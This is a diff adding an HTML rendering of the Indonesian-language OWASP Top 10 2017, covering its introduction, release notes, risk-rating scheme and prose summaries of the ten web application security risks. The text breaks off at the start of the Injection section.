@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>OWASP Top 10 2017</title>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 20px;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">OWASP Top 10 2017</h1>
+</header>
+<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
+<h2 id="owasp-top-10-2017">OWASP Top 10 2017</h2>
+<p>10 Resiko Keamanan Aplikasi Web Paling Kritis</p>
+<p>November 20, 2017</p>
+<h3 id="release">Release</h3>
+<p>Comments requested per instructions within</p>
+<p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
+<table>
+<thead>
+<tr class="header">
+<th></th>
+<th><img src="images/front-cc.png" alt="Creative Commons License Logo" /></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><a href="https://owasp.org">https://owasp.org</a></td>
+<td>Karya ini dilisensikan di bawah Creative Commons Attribution-ShareAlike 4.0 Lisensi internasional</td>
+</tr>
+</tbody>
+</table>
+<h1 id="rilis">Rilis</h1>
+<h2 id="pemberitahuan-penting">Pemberitahuan Penting</h2>
+<p>Ini adalah versi teks dari OWASP Top 10, dan meskipun ini berguna bagi penerjemah dan mereka yang tertarik dengan versi teks, ini bukan rilis resmi, yaitu versi PowerPoint / PDF.</p>
+<p>Pada tahap ini, kami membutuhkan</p>
+<ul>
+<li>Terjemahan - kami memiliki beberapa tim yang melakukan pengerjaan, tapi hubungi kami jika Anda dapat membantu</li>
+</ul>
+<p>Kami sangat mendesak agar semua koreksi atau masalah harus dicatat di GitHub:</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
+</ul>
+<p>Melalui transparansi publik, kami menyediakan penelusuran dan memastikan bahwa semua suara didengar selama bulan terakhir ini sebelum dipublikasikan.</p>
+<ul>
+<li>Andrew van der Stock</li>
+<li>Brian Glas</li>
+<li>Neil Smithline</li>
+<li>Torsten Gigler</li>
+</ul>
+<h1 id="toc">TOC</h1>
+<p>&lt; replace me with a toc &gt;</p>
+<h1 id="o-tentang-owasp">O Tentang OWASP</h1>
+<h2 id="tentang-owasp">tentang OWASP</h2>
+<p>Open Web Application Security Project (OWASP) adalah komunitas terbuka yang didedikasikan untuk memungkinkan organisasi mengembangkan, membeli, dan memelihara aplikasi dan API yang dapat dipercaya.</p>
+<p>Di OWASP anda akan menemukan secara bebas dan terbuka mengenai:</p>
+<ul>
+<li>Tool dan standar keamanan aplikasi.</li>
+<li>Buku tentang uji keamanan aplikasi, pengembangan kode aman, dan review kode keamanan.</li>
+<li>Presentasi dan <a href="https://www.youtube.com/user/OWASPGLOBAL">video</a>.</li>
+<li><a href="https://cheatsheetseries.owasp.org/">Cheat sheets</a> untuk banyak topik umum.</li>
+<li>Kendali standar keamanan dan Pustaka Standart.</li>
+<li><a href="https://owasp.org/chapters/">Cabang Lokal Di Seluruh Dunia</a>.</li>
+<li>Riset Terkini.</li>
+<li>Konferensi OWASP di Seluruh Dunia (<a href="https://owasp.org/events/">https://owasp.org/events/</a>).</li>
+<li><a href="https://groups.google.com/a/owasp.org">Google Groups</a>.</li>
+</ul>
+<p>Dan Masih banyak lagi di: <a href="https://owasp.org"><a href="https://owasp.org">https://owasp.org</a></a>.</p>
+<p>Seluruh tool , dokumen, forum, dan cabang OWASP bebas dan terbuka bagi semua orang yang tertarik memperbaiki keamanan aplikasi.</p>
+<p>Kami menganjurkan pendekatan keamanan aplikasi sebagai permasalahan orang, proses, dan teknologi, karena pendekatan yang paling efektif untuk keamanan aplikasi memerlukan perbaikan pada bidang-bidang ini.</p>
+<p>OWASP adalah jenis organisasi baru. Kebebasan kami dari tekanan komersial memungkinkan kami memberikan informasi yang tidak bias, praktis, dan hemat biaya tentang keamanan aplikasi.</p>
+<p>OWASP tidak berafiliasi dengan perusahaan teknologi mana pun, meskipun kami mendukung penggunaan teknologi keamanan komersial yang diinformasikan. OWASP memproduksi berbagai jenis bahan secara kolaboratif, transparan, dan terbuka.</p>
+<p>Yayasan OWASP adalah entitas nonprofit yang memastikan kesuksesan jangka panjang proyek. Hampir semua orang yang terkait dengan OWASP adalah relawan, termasuk OWASP Board, OWASP Chapter Leader, Project Leader, dan Project Member. Kami mendukung penelitian keamanan yang inovatif dengan hibah dan infrastruktur.</p>
+<p>Ayo bergabung dengan kami!</p>
+<h2 id="copyright-and-license">Copyright and License</h2>
+<p><img src="images/license.png" alt="license" /></p>
+<p>Copyright © 2003-2021 The OWASP Foundation. This document is released under the Creative Commons Attribution Share-Alike 4.0 license. For any reuse or distribution, you must make it clear to others the license terms of this work.</p>
+<h2 id="kata-pengantar">Kata Pengantar</h2>
+<p>Software yang tidak aman telah mengancam infrastruktur keuangan, kesehatan, pertahanan, energi, dan infrastruktur kritikal lainnya. Dengan semakin kompleks dan terhubungnya infrastruktur digital kita, kesulitan mencapai keamanan aplikasi meningkat secara eksponensial. Kita tidak dapat lagi mentoleransi masalah keamanan sederhana seperti yang ditampilkan dalam OWASP Top 10.</p>
+<p>Banyak feedback yang diterima selama pembuatan OWASP Top 10 - 2017, lebih dari usaha OWASP Projek lainnya. Hal ini menunjukkan seberapa besar minat yang dimiliki komunitas untuk OWASP Top 10, dan dengan demikian betapa pentingnya bagi OWASP untuk mendapatkan Top 10 untuk Mayoritas kasus penggunaan web paling kritis .</p>
+<p>Meskipun tujuan awal dari proyek 10 Besar OWASP hanya untuk meningkatkan kesadaran di antara pengembang dan manajer, itu telah menjadi standar keamanan aplikasi secara de facto.</p>
+<p>Dalam rilis ini, masalah dan rekomendasi ditulis secara ringkas dan dengan cara yang dapat diuji untuk membantu penerapan OWASP Top 10 dalam program keamanan aplikasi. Kami mendorong organisasi besar dan kinerja yang tinggi untuk menggunakan OWASP Application Verification Standard (ASVS) <a href="https://owasp.org/www-project-application-security-verification-standard/">https://owasp.org/www-project-application-security-verification-standard/</a> jika standar yang benar diperlukan, tetapi untuk sebagian besar, OWASP Top 10 adalah awal yang bagus dalam keamanan aplikasi.</p>
+<p>Kami telah menulis berbagai langkah yang disarankan selanjutnya untuk pengguna yang berbeda dari OWASP Top 10, termasuk "Apa Selanjutnya untuk Pengembang Aplikasi", "Apa Selanjutnya untuk Penguji Keamanan", "Apa Selanjutnya untuk Organisasi", yang cocok untuk CIO dan CISO, dan "Apa Selanjutnya untuk Manajer pengembangan perangkat lunak/Aplikasi", yang cocok untuk manajer pengembang aplikasi atau siapa pun yang bertanggung jawab pada pengembangan perangkat lunak.</p>
+<p>Dalam jangka panjang, kami mendorong semua tim pengembangan perangkat lunak dan organisasi untuk membuat program keamanan aplikasi yang kompatibel dengan budaya dan teknologi Anda. Program-program tersebut datang dalam semua bentuk dan ukuran. Buatlah keputusan dalam organisasi Anda yang ada untuk mengukur dan meningkatkan program keamanan aplikasi Anda menggunakan Software Assurance Maturity Model / OWASP SAMM.</p>
+<p>Kami berharap bahwa OWASP Top 10 bermanfaat dalam upaya peningkatan keamanan aplikasi Anda. Jangan ragu untuk menghubungi OWASP dengan pertanyaan, komentar, dan ide Anda di repositori proyek GitHub kami:</p>
+<ul>
+<li><a href="https://github.com/OWASP/Top10/issues"><a href="https://github.com/OWASP/Top10/issues">https://github.com/OWASP/Top10/issues</a></a></li>
+</ul>
+<p>Anda bisa mendapatkan Proyek OWASP Top 10 dan Terjemahannya di sini :</p>
+<ul>
+<li><a href="https://owasp.org/www-project-top-ten/"><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></a></li>
+</ul>
+<p>Terakhir, kami mengucapkan terimakasih kepada pimpinan pendiri proyek OWASP Top 10, Dave Wichers dan Jeff Williams, atas semua upaya mereka, dan memercayai kami untuk menyelesaikannya dengan bantuan komunitas. Terima kasih!</p>
+<ul>
+<li>Andrew van der Stock</li>
+<li>Brian Glas</li>
+<li>Neil Smithline</li>
+<li>Torsten Gigler</li>
+</ul>
+<h2 id="atribusi">Atribusi</h2>
+<p>Terimakasih kepada <a href="https://www.autodesk.com">Autodesk</a> dalam mensponsori OWASP Top 10 - 2017.</p>
+<p>Organisasi dan individu yang telah membantu menyediakan data prevalensi kerentanan atau bantuan lainnya berada pada [Halaman Ucapan Terima Kasih] (0xd1-data-contributors.md)</p>
+<h1 id="pendahuluan">Pendahuluan</h1>
+<h2 id="selamat-datang-di-owasp-top-10---2017">Selamat datang di OWASP Top 10 - 2017</h2>
+<p>Pembaruan utama ini menambahkan beberapa isu baru, termasuk dua isu yang dipilih oleh masyarakat - A8: 2017-Insecure Deserialization and A10: 2017-Insufficient Logging and Monitoring. Dua pembeda utama dari rilis OWASP Top 10 sebelumnya adalah umpan balik komunitas yang substansial dan data ekstensif yang dikumpulkan dari puluhan organisasi, mungkin jumlah data terbesar yang pernah dikumpulkan dalam pembuatan standar keamanan aplikasi. Ini memberi kami keyakinan bahwa OWASP Top 10 yang baru menangani risiko keamanan aplikasi yang paling berdampak saat ini yang dihadapi organisasi.</p>
+<p>OWASP Top 10 untuk 2017 didasarkan terutama pada 40+ pengiriman data dari perusahaan yang mengkhususkan diri pada keamanan aplikasi dan survei industri yang diselesaikan oleh lebih dari 500 individu. Data ini mencakup kerentanan yang dikumpulkan dari ratusan organisasi dan lebih dari 100.000 aplikasi dan API dunia nyata. 10 item teratas dipilih dan diprioritaskan sesuai dengan data prevalensi ini, dikombinasikan dengan perkiraan konsensus tentang exploitability, detectability, dan impact.</p>
+<p>Tujuan utama dari OWASP Top 10 adalah untuk mendidik pengembang, perancang, arsitek, manajer, dan organisasi tentang konsekuensi kelemahan keamanan aplikasi web yang paling umum dan paling penting. Top 10 menyediakan teknik dasar untuk melindungi area masalah berisiko tinggi ini, dan memberikan panduan ke mana harus pergi dari sini.</p>
+<h2 id="peta-jalan-untuk-kegiatan-selanjutnya">Peta jalan untuk kegiatan selanjutnya</h2>
+<p>Jangan berhenti pada OWASP Top 10. Ada ratusan masalah yang dapat mempengaruhi keseluruhan keamanan aplikasi web seperti yang dibahas dalam OWASP Developer's Guide dan OWASP Cheat Sheet Series. Ini adalah bacaan penting bagi siapa saja yang mengembangkan aplikasi web dan API. Panduan tentang cara menemukan kerentanan di aplikasi web dan API secara efektif disediakan di Panduan Pengujian OWASP.</p>
+<p>Perubahan terus-menerus. OWASP Top 10 akan terus berubah. Bahkan tanpa mengubah satu baris kode aplikasi Anda, Anda mungkin menjadi rentan karena kekurangan baru ditemukan dan metode serangan disempurnakan. Harap tinjau saran di akhir Top 10 di Apa Selanjutnya untuk Pengembang, Penguji, Organisasi, dan Manajer Aplikasi untuk informasi lebih lanjut.</p>
+<p>Berpikir positif. Bila Anda siap untuk berhenti mengejar kerentanan dan fokus untuk membangun kontrol keamanan aplikasi yang kuat, OWASP Proactive Controls memberikan titik awal untuk membantu pengembang membangun keamanan ke dalam aplikasinya dan OWASP Application Security Verification Standard (ASVS) adalah panduan untuk organisasi dan pemeriksa aplikasi tentang apa yang harus diverifikasi.</p>
+<p>Gunakan alat dengan bijak. Kerentanan keamanan bisa sangat rumit dan terkubur dalam kode. Dalam banyak kasus, pendekatan yang paling hemat biaya untuk menemukan dan menghilangkan kelemahan ini adalah pakar manusia yang dipersenjatai dengan alat canggih. Bergantung pada alat saja memberikan rasa aman yang salah dan tidak disarankan.</p>
+<p>Dorong ke kiri, kanan, dan di mana-mana. Fokus pada keamanan merupakan bagian integral dari budaya Anda di seluruh organisasi pembangunan Anda. Cari tahu lebih lanjut dalam OWASP Software Assurance Maturity Model (SAMM).</p>
+<h2 id="atribusi-1">Atribusi</h2>
+<p>Kami ingin mengucapkan terima kasih kepada organisasi yang menyumbangkan data kerentanan mereka untuk mendukung pembaruan 2017. Kami menerima lebih dari 40 tanggapan atas permintaan data. Untuk pertama kalinya, semua data berkontribusi pada rilis OWASP Top 10, dan daftar kontributor lengkap, tersedia untuk umum. Kami percaya ini adalah salah satu kumpulan data kerentanan yang lebih besar dan beragam yang dikumpulkan di masyarakat.</p>
+<p>Karena ada lebih banyak kontributor daripada ruang di sini, kami telah membuat halaman khusus untuk mengenali kontribusi yang dibuat. Kami ingin mengucapkan terima kasih yang tulus kepada organisasi-organisasi ini karena bersedia berada di garis depan dengan membagikan data kerentanan secara terbuka dari usaha mereka. Kami berharap ini akan terus berkembang dan mendorong lebih banyak organisasi untuk melakukan hal yang sama dan mungkin dipandang sebagai salah satu tonggak utama keamanan berbasis bukti. OWASP Top 10 tidak akan mungkin terjadi tanpa kontribusi yang menakjubkan ini.</p>
+<p>Terima kasih yang sebesar-besarnya kepada lebih dari 500 individu yang meluangkan waktu untuk menyelesaikan survei peringkat industri. Suara Anda membantu menentukan dua tambahan baru ke Top 10. Komentar tambahan, catatan dorongan, dan kritik semuanya dihargai. Kami tahu waktu Anda sangat berharga dan kami ingin mengucapkan terima kasih.</p>
+<p>Kami ingin mengucapkan terima kasih kepada orang-orang yang memberikan komentar konstruktif yang signifikan dan waktu untuk meninjau pembaruan ini ke 10 Besar. Sebisa mungkin, kami telah mendaftarkannya di halaman "Ucapan Terima Kasih".</p>
+<p>Dan akhirnya, kami ingin mengucapkan terima kasih terlebih dahulu kepada semua penerjemah di luar sana yang akan menerjemahkan peluncuran Top 10 ini ke dalam berbagai bahasa yang berbeda, membantu membuat OWASP Top 10 lebih mudah diakses ke seluruh planet.</p>
+<h1 id="rn-catatan-rilis">RN Catatan Rilis</h1>
+<h2 id="apa-yang-berubah-dari-tahun-2013-sampai-2017">Apa yang berubah dari tahun 2013 sampai 2017?</h2>
+<p>Perubahan telah meningkat selama empat tahun terakhir, dan OWASP Top 10 perlu diubah. Kami telah benar-benar melakukan refactored OWASP Top 10, mengubah metodologinya, menggunakan proses panggilan data baru, bekerja dengan masyarakat, mengatur ulang risiko kami, menulis ulang setiap risiko dari awal, dan menambahkan referensi ke kerangka kerja dan bahasa yang sekarang sudah biasa digunakan</p>
+<p>Selama beberapa tahun terakhir, teknologi dan arsitektur mendasar dari aplikasi telah berubah secara signifikan:</p>
+<p>Microservices yang ditulis di node.js dan Spring Boot menggantikan aplikasi monolitik tradisional. Microservices hadir dengan tantangan keamanan mereka sendiri termasuk membangun kepercayaan antara layanan mikroservice, kontainer, manajemen rahasia, dan lain-lain. Kode lama yang tidak pernah diharapkan dapat diakses dari Internet sekarang duduk di belakang layanan web API atau RESTful untuk dikonsumsi oleh Aplikasi Halaman Tunggal (SPA) dan aplikasi mobile. Asumsi arsitektur menurut kode, seperti penelepon yang terpercaya, sudah tidak berlaku lagi. Aplikasi halaman tunggal, yang ditulis dalam kerangka kerja JavaScript seperti Angular and React, memungkinkan pembuatan front end yang kaya fitur modular. Fungsi sisi klien yang secara tradisional telah disampaikan sisi server membawa tantangan keamanan tersendiri. JavaScript sekarang menjadi bahasa utama web dengan node.js menjalankan sisi server dan kerangka web modern seperti Bootstrap, Electron, Angular, dan React yang berjalan pada klien.</p>
+<h2 id="isu-baru-didukung-data">Isu baru, didukung data</h2>
+<p>A4: 2017-XML Entitas Eksternal (XXE) adalah kategori baru yang terutama didukung oleh kumpulan perangkat analisis keamanan pengujian (SAST) kumpulan kode (<a href="https://owasp.org/www-community/Source_Code_Analysis_Tools)">https://owasp.org/www-community/Source_Code_Analysis_Tools)</a>) sumber.</p>
+<h2 id="isu-baru-didukung-oleh-masyarakat">Isu baru, didukung oleh masyarakat</h2>
+<p>Kami meminta masyarakat untuk memberikan wawasan tentang dua kategori kelemahan kedepan. Setelah lebih dari 500 pengantar peer, dan menghapus isu-isu yang sudah didukung oleh data (seperti Sensitive Data Exposure and XXE), dua isu baru tersebut adalah:</p>
+<p>A8: 2017-Insecure Deserialization, yang memungkinkan eksekusi kode jarak jauh atau manipulasi objek sensitif pada platform yang terpengaruh. A10: 2017-Pembukaan dan Pemantauan Tidak Cukup, kurangnya yang dapat mencegah atau secara signifikan menunda aktivitas berbahaya dan deteksi pelanggaran, respon insiden, dan forensik digital.</p>
+<h2 id="digabung-atau-dihilangkan-tapi-tidak-dilupakan">Digabung atau dihilangkan, tapi tidak dilupakan</h2>
+<p>A4-Referensi Objek Langsung Tidak aman dan A7-Kehilangan fungsi level akses kontrol digabungkan menjadi A5: 2017-Kontrol Akses Yang Buruk. A8-Cross-Site Request Forgery (CSRF), karena banyak kerangka mencakup pertahanan CSRF (<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a>), hanya ditemukan 5% aplikasi. A10-Unvalidated Redirects and Forwards, sementara ditemukan di sekitar 8% aplikasi, diarsipkan secara keseluruhan oleh XXE.</p>
+<p><img src="images/0x06-release-notes-1.png" alt="0x06-release-notes-1" /></p>
+<h1 id="risiko---risiko-keamanan-aplikasi">Risiko - Risiko Keamanan Aplikasi</h1>
+<h2 id="apa-saja-risiko-keamanan-aplikasi">Apa Saja Risiko Keamanan Aplikasi??</h2>
+<p>Penyerang berpotensi menggunakan beragam cara melalui aplikasi Anda untuk membahayakan bisnis atau organisasi Anda. Setiap cara mewakili risiko, yang mungkin, cukup serius untuk memperoleh perhatian.</p>
+<p><img src="images/0x10-risk-1.png" alt="App Security Risks" /></p>
+<p>Terkadang cara ini mudah ditemukan dan dieksploitasi, namun kadang-kadang sulit. Demikian juga, kerusakan yang diakibatkan dapat berkisar dari tidak ada apa-apa hingga membuat Anda keluar dari bisnis. Untuk menentukan risiko di organisasi Anda, Anda dapat mengevaluasi kemungkinan yang diasosiasikan untuk setiap agen ancaman, vektor serangan, kelemahan keamanan, dan mengkombinasikan dengan estimasi dampak teknis dan bisnis bagi organisasi Anda. Semua faktor ini menentukan risiko keseluruhan.</p>
+<h2 id="apa-risiko-saya">Apa Risiko Saya?</h2>
+<p><a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> ini berfokus pada identifikasi risiko yang paling serius bagi sebagian besar organisasi. Untuk setiap risiko, kami memberikan informasi umum mengenai kemungkiinan dan dampak teknis dengan menggunakan skema penilaian sederhana berikut, yang berdasarkan pada OWASP Risk Rating Methodology.  </p>
+<table>
+<thead>
+<tr class="header">
+<th>Agen Ancaman</th>
+<th>Vektor Serangan</th>
+<th>Keberadaan kelemahan</th>
+<th>Deteksi Kelemahan</th>
+<th>Dampak Teknis</th>
+<th>Dampak Bisnis</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Appli-</td>
+<td>Mudah 3</td>
+<td>Tersebar 3</td>
+<td>Mudah 3</td>
+<td>Parah 3</td>
+<td>Bisnis</td>
+</tr>
+<tr class="even">
+<td>kasi</td>
+<td>Menengah 2</td>
+<td>Umum 2</td>
+<td>Rata - rata 2</td>
+<td>Sedang 2</td>
+<td>Spesifik</td>
+</tr>
+<tr class="odd">
+<td>Spesifik</td>
+<td>Sulit 1</td>
+<td>Tidak Umum 1</td>
+<td>Sulit 1</td>
+<td>Rendah 1</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Pada Edisi ini, kami telah memperbaharui Penilaian Risiko Sistem untuk membantu dalam menghitung kemungkinan dan dampak dari risiko tertentu. Untuk Lebih Detail, Lihat pada <a href="0xc0-note-about-risks.md">Catatan tentang Risiko</a>.</p>
+<p>Setiap organisasi itu unik, begitu pula aktor ancaman untuk organisasi tersebut, tujuan mereka, dan dampak dari setiap pelanggaran. Jika organisasi kepentingan publik menggunakan sistem manajemen konten (CMS) untuk informasi publik dan sistem kesehatan menggunakan CMS yang sama persis untuk catatan kesehatan yang sensitif, pelaku ancaman dan dampak bisnis dapat sangat berbeda untuk perangkat lunak yang sama. Penting untuk memahami risiko organisasi Anda berdasarkan pada agen ancaman dan dampak bisnis yang berlaku.</p>
+<p>Bila memungkinkan, nama risiko di Top 10 sesuai dengan <a href="https://cwe.mitre.org/">Common Weakness Enumeration</a> (CWE) kelemahan untuk mempromosikan konvensi penamaan yang berlaku umum dan untuk mengurangi kekeliruan.</p>
+<h2 id="referensi">Referensi</h2>
+<h3 id="owasp">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">OWASP Risk Rating Methodology</a></li>
+<li><a href="https://owasp.org/www-community/Threat_Modeling">Article on Threat/Risk Modeling</a></li>
+</ul>
+<h3 id="eksternal">Eksternal</h3>
+<ul>
+<li><a href="https://www.iso.org/iso-31000-risk-management.html">ISO 31000: Risk Management Std</a></li>
+<li><a href="https://www.iso.org/isoiec-27001-information-security.html">ISO 27001: ISMS</a></li>
+<li><a href="https://www.nist.gov/cyberframework">NIST Cyber Framework (US)</a></li>
+<li><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/strategies-mitigate-cyber-security-incidents">ASD Strategic Mitigations (AU)</a></li>
+<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">NIST CVSS 3.0</a></li>
+<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">Microsoft Threat Modelling Tool</a></li>
+</ul>
+<h1 id="t10-owasp-top-10-resiko-keamanan-aplikasi--2017">T10 OWASP Top 10 Resiko Keamanan Aplikasi – 2017</h1>
+<p>| Risk | Description | | -- | -- | | A1:2017-Injeksi | celah injeksi, seperti SQL,OS dan LDAP injection terjadi ketika data yang berbahaya dikirim ke interpreter sebagai bagian dari perintah atau query. Data berbahaya milik penyerang dapat mengelabui interpreter untuk mengeksekusi perintah yang tidak diinginkan atau mengakses data secara ilegal . | | A2:2017- Kerusakan Otentikasi |fungsi aplikasi yang berhubungan dengan otentikasi dan manajemen sesi sering tidak diterapkan dengan benar,sehingga memungkinkan penyerang untuk mengambil password-pasword, kunci-kunci, token-token sesi, atau untuk mengeksploitasi celah implementasi lainnya untuk mengambil identitas pengguna. | | A3:2017-Pengungkapan Data Sensitif | banyak aplikasi web yang tidak melindungi data rahasia dengan baik. Sepert kartu kredit, nomor PIN, dan kewenangan-kewenangan otentikasi. Penyerang akan mencuri atau merubah data yang diproteksi dengan lemah, untuk melakukan tindak pencurian identitas, kejahatan lewat kartu kredit, pencurian identitas, atau kejahatan lainnya. Data rahasia pantas terlindungi dengan baik menggunakan sandi enskripsi ketika tinggal atau dalam transit, sebagai pencegahan khusus atas tidak kejahatan ketika ketika tampil di browser. | | A4:2017-XML External Entities (XXE) | banyak bahasa XML versi lebih tua atau yang tidak dikonfigurasi dengan baik mengevaluasi referensi entitas eksternal dalam dokumen XML. Entitas eksternal dapat digunakan untuk mengungkapkan file internal menggunakan penangan URI file, pembagian file internal, pemindaian port internal, eksekusi kode jarak jauh, dan penolakan serangan layanan| | A5:2017-Kontrol Akses Yang Buruk| Pembatasan pada apa yang diizinkan oleh pengguna yang diautentikasi sering kali tidak dilakukan dengan benar. Penyerang dapat mengeksploitasi kelemahan ini untuk mengakses fungsionalitas dan / atau data yang tidak sah, seperti mengakses akun pengguna lain, melihat file sensitif, memodifikasi data pengguna lain, mengubah hak akses, dll.| | A6:2017-Kesalahan Konfigurasi Keamanan | keamanan yang baik memerlukan konfigurasi keamanan yang terperinci dan telah menyeluruh pada framework aplikasi, aplikasi pada server, web server, database dan sistem operasi. Semua pengaturan ini harus didefinisikan, diimplementasikan, dan dan dipelihara, karena terdapat banyak aplikasi yang dirilis tanpa konfigurasi default yang aman. Termasuk menjaga semua software untuk tetap terbarukan (up to date)..| | A7:2017-Cross-Site Scripting (XSS) |Celah XSS terjadi ketika sebuah aplikasi mengambil data berbahaya dan mengirimkannya ke web browser dengan tanpa memvalidasi atau melepaskan konten tersebut dengan benar. XSS mengijinkan penyerang mengeksekusi script di browser target sehingga dapat leluasa mengambil alih data pengguna, merubah tampilan website target, atau mengarahkan korban ke laman yang berbahaya.| | A8:2017-Deserialisasi Yang Tidak Aman | Deserialisasi Yang Tidak Aman sering mengarah ke eksekusi kode jarak jauh. Meskipun kekurangan deserialization, mereka dapat digunakan untuk melakukan serangan, termasuk replay attacks, serangan injeksi, dan serangan exploitasi hak level istimewa.| | A9:2017- Menggunakan Komponen yang Diketahui Rentan | Komponen, seperti libraries, frameworks, dan modul perangkat lunak lainnya, dijalankan dengan hak yang sama seperti aplikasi. Jika komponen rentan dieksploitasi, serangan semacam itu dapat memfasilitasi hilangnya data serius atau pengambilalihan server. Aplikasi dan API yang menggunakan komponen dengan kerentanan yang diketahui dapat merusak pertahanan aplikasi dan memungkinkan berbagai serangan dan berdampak.| | A10:2017-Kurangnya logging dan monitoring| Logging / Pencatatan dan pemantauan yang tidak memadai, ditambah dengan integrasi yang hilang atau tidak efektif dengan respons insiden, memungkinkan penyerang untuk menyerang sistem lebih lanjut, mempertahankan exploitasi, beralih ke lebih banyak sistem, dan mengutak-atik, mengekstrak, atau menghancurkan data. Sebagian besar studi pelanggaran menunjukkan waktu untuk mendeteksi pelanggaran lebih dari 200 hari, biasanya terdeteksi oleh pihak eksternal daripada proses internal atau pemantauan.|</p>
+<h1 id="a12017-injection">A1:2017 Injection</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Agen ancaman / vektor serangan</th>
+<th>Kelemahan Keamanan</th>
+<th>Dampak</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Akses Lvl: Eksploitasi 3</td>
+<td>Prevalensi 2: Deteksi 3</td>
+<td>Teknis 3: Bisnis</td>
+</tr>
+<tr class="even">
+<td>Hampir semua sumber data bisa berupa vektor injeksi, variabel lingkungan, parameter, layanan web eksternal dan internal, dan semua jenis pengguna. <a href="https://owasp.org/www-community/Injection_Flaws">Kekurangan injeksi</a> terjadi ketika penyerang bisa mengirim data yang tidak bersahabat ke penerjemah.</td>
+<td>Cacat injeksi sangat lazim, terutama dalam kode warisan. Kerentanan injeksi sering ditemukan di query SQL, LDAP, XPath, atau NoSQL, perintah OS, parser XML, header SMTP, ekspresi bahasa, dan kueri ORM. Kelemahan injeksi mudah ditemukan saat memeriksa kode. Pemindai dan fuzzers dapat membantu penyerang menemukan kekurangan injeksi.</td>
+<td>Injeksi dapat mengakibatkan kehilangan data, rusak, atau pengungkapan kepada pihak yang tidak berwenang, kehilangan pertanggungjawaban, atau penolakan akses. Injeksi terkadang bisa mengakibatkan pengambilalihan host seacara keseluruhan. Dampak bisnis tergantung dari kebutuhan aplikasi dan data.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="apakah-aplikasi-itu-rentan">Apakah Aplikasi itu Rentan?</h2>
+<p>Aplikasi rentan terhadap serangan saat:</p>
+<ul>
